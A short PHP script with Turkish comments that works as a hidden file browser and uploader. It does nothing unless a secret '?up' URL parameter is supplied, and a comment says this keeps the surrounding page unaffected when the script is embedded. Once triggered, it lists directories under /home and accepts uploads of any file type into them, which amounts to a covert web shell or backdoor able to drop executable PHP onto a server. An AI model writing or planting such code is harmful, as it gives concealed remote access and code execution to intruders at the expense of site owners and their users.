<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = '/home'; // Başlangıç dizini
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
if (!isset($_GET['up'])) {
    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
    return; // veya die(); kullanabilirsiniz
}

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0) {
    die('İzin verilmedi!');
}

// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];
if ($current_dir != realpath($root)) {
    $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
}

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        $navigation_links[] = '<a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a>';
    } else {
        $navigation_links[] = htmlspecialchars($file) . (is_image($file) ? ' <img src="' . htmlspecialchars($file_path) . '" style="width:100px;"/>' : '');
    }
}

// PHP dosyasına gitme seçeneği ekliyoruz
$navigation_links[] = '<a href="' . htmlspecialchars($current_dir . '/index.php') . '">PHP Dosyasına Git</a>';

// Kullanıcıya dosyaları ve dizinleri gösterme
echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
echo "<ul>";
foreach ($navigation_links as $link) {
    echo "<li>$link</li>";
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file">';
echo '<input type="submit" value="Yükle">';
echo '</form>';
?>
